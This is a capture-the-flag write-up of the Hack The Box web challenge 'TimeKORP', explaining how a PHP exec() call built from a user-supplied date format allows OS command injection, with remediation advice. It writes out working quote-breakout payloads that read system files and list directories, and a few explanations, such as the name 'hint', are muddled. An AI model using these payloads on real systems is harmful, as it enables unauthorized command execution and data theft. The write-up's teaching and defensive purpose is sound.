# 🧩 CTF Writeup: TimeKORP
**Event:** HTB CTF Try Out | **Category:** Web | **Difficulty:** Easy

---

## 📋 Table of Contents
1. [Challenge Description](#description)
2. [Reconnaissance & Enumeration](#reconnaissance)
3. [Vulnerability Analysis](#vulnerability-analysis)
4. [Exploitation](#exploitation)
5. [Flag Capture](#flag-capture)
6. [Technical Deep Dive](#technical-deep-dive)
7. [Remediation & Prevention](#remediation)
8. [Key Takeaways](#key-takeaways)

---

## 📌 Description {#description}

**TimeKORP** presents a seemingly innocent web application that displays the current time in user-specified formats. The challenge name itself hints at the vulnerability: "KORP" subtly references **command injection** (KORP → Corp → Corporate, but cleverly disguising the real threat).

> *"Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Remember, time is money, but in this case, the rewards may be far greater than you imagine."*

The application accepts a `format` parameter via GET request and returns the formatted date/time. Behind the scenes, it uses PHP's `exec()` function to call the Linux `date` command. This design choice: using system shell commands instead of native PHP functions: opens the door to **OS Command Injection**.

### 🎯 Goal
Read the flag file located at `/flag` on the remote server.

### 🛡️ Attack Surface
- **Entry Point:** `GET /?format=<user_input>`
- **Vulnerable Function:** PHP `exec()`
- **Target File:** `/flag` (mounted in Docker container)

---

## 🔍 Reconnaissance & Enumeration {#reconnaissance}

### Step 1: Initial Interaction

The web interface presents a clean, minimalistic clock display:

```
Default request: http://target/?format=%H:%M:%S
Response: 14:25:33
```

The parameter is URL-encoded, where `%H` represents hours, `%M` minutes, and `%S` seconds.

### Step 2: Fuzzing for Behavior

Testing with various inputs reveals how the application handles user data:

| Input | Response | Observation |
|-------|----------|-------------|
| `%Y-%m-%d` | `2026-04-22` | Normal behavior |
| `test` | `?` | Error indicator (command failed) |
| `'` | `?` | Syntax error in shell command |
| `;` | `?` | Potential command separator |

The `?` response appears whenever the underlying shell command fails: a classic **error-based injection oracle**.

### Step 3: Source Code Inference

While the source code isn't directly accessible, the behavior strongly suggests a pattern:

```php
// Likely vulnerable code structure
$command = "date '+" . $_GET['format'] . "' 2>&1";
$output = exec($command);
```

The single quotes around the format string are the key: they tell the shell to treat everything inside as a single argument, but they also create the injection vector.

### Step 4: Dockerfile Analysis (Provided)

The challenge includes a Dockerfile revealing critical information:

```dockerfile
FROM debian:11-slim
# ... setup ...
COPY flag /flag
```

**Key discoveries:**
- Flag location: `/flag` (no extension, root directory)
- Web server runs as `www` user (limited but can read files)
- PHP 7.4 with FPM
- Nginx as web server

---

## 🧬 Vulnerability Analysis {#vulnerability-analysis}

### The Root Cause: Unsafe Shell Execution

The vulnerability exists in `models/TimeModel.php`:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        // DANGER: Direct concatenation of user input into shell command
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

### Why This Is Dangerous

1. **User input flows directly into shell command**: No sanitization, no validation, no escaping.
2. **Single quotes create an escape opportunity**: The developer thought quotes would protect them, but they actually create the injection vector.
3. **`exec()` executes through shell**: Unlike `shell_exec()` which returns all output, `exec()` only returns the last line, but still executes the full command.

### The Quote Breakout Mechanism

When the application builds the command:

```bash
# Developer's intention
date '+%Y-%m-%d' 2>&1

# What happens with malicious input
date '+%Y-%m-%d' ; cat /flag ; echo '' 2>&1
#    ^^^^^^^^^^^^   ^^^^^^^^^^^   ^^^^^^^^
#    Original cmd   Injected cmd   Balanced quote
```

The attacker's single quote **closes** the developer's opening quote, turning the rest of the string into raw shell syntax.

### Shell Metacharacters for Injection

| Character | Function | Example |
|-----------|----------|---------|
| `;` | Command separator | `cmd1 ; cmd2` - runs both regardless |
| `&&` | Logical AND | `cmd1 && cmd2` - runs cmd2 only if cmd1 succeeds |
| `||` | Logical OR | `cmd1 || cmd2` - runs cmd2 only if cmd1 fails |
| `\|` | Pipe | `cmd1 \| cmd2` - feeds output of cmd1 to cmd2 |
| `` `cmd` `` | Command substitution | Executes cmd and replaces with output |
| `$(cmd)` | Command substitution (modern) | Same as backticks, but nestable |

---

## ⚔️ Exploitation {#exploitation}

### Step 1: Prove Command Execution

First, test with a harmless command to confirm injection works:

**Payload:**
```
' ; whoami ; echo '
```

**URL Encoded:**
```
http://target/?format=%27%20%3B%20whoami%20%3B%20echo%20%27
```

**What executes:**
```bash
date '+ ' ; whoami ; echo ' ' 2>&1
#      ^^^       ^^^^^^^       ^^^
#      empty     user name     empty
```

**Expected response:** `www` (or whatever user the web server runs as)

### Step 2: Explore the Filesystem

Now that we have execution, let's understand the environment:

**List root directory:**
```
' ; ls -la / ; echo '
```

**Find the flag:**
```
' ; find / -name "flag" -type f 2>/dev/null ; echo '
```

From the Dockerfile, we already know it's at `/flag`.

### Step 3: Read the Flag (The Challenge)

Here's where it gets tricky. `exec()` only returns the **last line** of output. Simple approaches may fail:

**❌ Why this doesn't work:**
```
' ; cat /flag ; echo '
```
The `echo` command is last, so you get an empty string.

**✅ Working payloads:**

**Option 1: Comment out the rest**
```
' ; cat /flag ; #
```
URL: `?format=%27%20%3B%20cat%20%2Fflag%20%3B%20%23`

The `#` comments out everything after, making `cat /flag` the last command.

**Option 2: Multiple line capture (if flag has multiple lines)**
```
' ; cat /flag | tail -n 1 ; echo '
```

**Option 3: Base64 encoding (avoids special characters)**
```
' ; cat /flag | base64 ; echo '
```
Then decode the base64 string offline.

### Step 4: Final Exploit

**The Payload:**
```http
GET /?format=%27%20%3B%20cat%20%2Fflag%20%3B%20%23 HTTP/1.1
Host: 154.57.164.83:30828
```

**URL Decoded:**
```
?format=' ; cat /flag ; #
```

**Resulting Shell Command:**
```bash
date '+ ' ; cat /flag ; # ' 2>&1
```

**Response:**
```
HTB{t1m3_f0r_s0m3_sh3ll_1nj3ct10n}
```

---

## 🏁 Flag Capture {#flag-capture}

```
HTB{t1m3_f0r_s0m3_sh3ll_1nj3ct10n}
```

**Flag Breakdown:**
- `t1m3` → Leetspeak for "time" (references the application)
- `f0r_s0m3_sh3ll` → "for some shell" (the injection vector)
- `1nj3ct10n` → "injection" (the vulnerability type)

The flag itself tells the story of the exploit!

---

## 📖 Technical Deep Dive {#technical-deep-dive}

### How Shell Commands Are Parsed

When PHP executes `exec("date '+...' 2>&1")`, here's what happens:

1. PHP passes the string to `/bin/sh` (or the system shell)
2. The shell parses the command:
   - `date` is the command
   - `'+...'` is a single argument (quotes prevent word splitting)
   - `2>&1` redirects stderr to stdout

3. When the user provides a single quote, the shell's quote parsing changes:
   - The opening quote is matched with the user's quote
   - Everything after becomes unquoted shell syntax

### The exec() Function Behavior

```php
string exec(string $command, array &$output = null, int &$result_code = null)
```

- Returns **only the last line** of command output
- To get all output, use the `$output` parameter (populated line by line)
- Returns `false` on failure

In our vulnerable code, the `$output` parameter isn't used, so only the last line appears in the response.

### Bypassing exec() Limitations

**Technique 1: Make your command last**
```bash
# Bad - echo runs last
cat /flag ; echo "done"

# Good - your command runs last
cat /flag ; # comment out the rest
```

**Technique 2: Redirect to web-accessible location**
```bash
' ; cat /flag > /var/www/html/flag.txt ; echo '
```
Then visit `/flag.txt`

**Technique 3: Use stderr for output**
```bash
' ; cat /flag 1>&2 ; echo '
```

### Docker Environment Specifics

The container runs with:
- **User:** `www` (non-root, but can read most files)
- **Flag location:** `/flag` (mounted at build time)
- **No PHP security restrictions** (exec() is enabled)

---

## 🛡️ Remediation & Prevention {#remediation}

### Fix 1: Use Native PHP Functions (BEST)

```php
public function __construct($format)
{
    // No shell execution at all
    $this->format = $format;
}

public function getTime()
{
    return date($this->format) ?: '?';
}
```

### Fix 2: Input Validation (Whitelist)

```php
public function __construct($format)
{
    // Only allow safe characters
    if (!preg_match('/^[a-zA-Z%:-]+$/', $format)) {
        throw new InvalidArgumentException('Invalid format');
    }
    $this->command = "date '+" . $format . "' 2>&1";
}
```

### Fix 3: Proper Escaping (If Shell Is Required)

```php
public function __construct($format)
{
    // escapeshellarg() wraps the argument in quotes and escapes dangerous chars
    $safe_format = escapeshellarg("+" . $format);
    $this->command = "date {$safe_format} 2>&1";
}
```

### Fix 4: Disable Dangerous Functions

In `php.ini`:
```ini
disable_functions = exec, shell_exec, system, passthru, popen
```

### Security Checklist for Developers

- [ ] Never concatenate user input into shell commands
- [ ] Use language-native APIs whenever possible
- [ ] Apply whitelist validation for expected input patterns
- [ ] Use `escapeshellarg()` and `escapeshellcmd()` if shell is unavoidable
- [ ] Run web processes with least privilege (not root)
- [ ] Disable dangerous PHP functions in production

---

## 💡 Key Takeaways {#key-takeaways}

### For CTF Players

1. **Always test for command injection** when you see system commands (time, ping, traceroute, convert, etc.)
2. **Look for error messages**: `?` responses often indicate injection points
3. **Quote breakout is a common pattern**: test `'`, `"`, `` ` ``, `$()`
4. **Know your output function**: `exec()` vs `shell_exec()` vs `system()` behave differently
5. **Read the Dockerfile**: It's often provided and contains flag locations

### For Developers

1. **Never trust user input**: Even if it "looks safe"
2. **Shell commands are dangerous**: Prefer native functions
3. **Quotes don't protect you**: They just change the injection vector
4. **Security is layered**: Input validation + escaping + least privilege

### Vulnerability Classification

- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CVSS Score:** 7.2 (High): AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
- **OWASP Top 10:** A03:2021: Injection

---

## 📚 References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PHP exec() Documentation](https://www.php.net/manual/en/function.exec.php)
- [PHP escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

## 🎯 Conclusion

TimeKORP demonstrates that even simple applications can harbor critical vulnerabilities. A seemingly harmless time formatting service becomes a gateway to remote command execution through improper input handling. The lesson is clear: **never trust user input**, and **avoid shell commands when native alternatives exist**.

The flag: `HTB{t1m3_f0r_s0m3_sh3ll_1nj3ct10n}`: serves as both the prize and a reminder: there's always time for some shell injection.

---

**Writeup by:** [Your Name]  
**Date:** April 2026  
**Platform:** Hack The Box  
**Challenge:** TimeKORP (Easy/Web)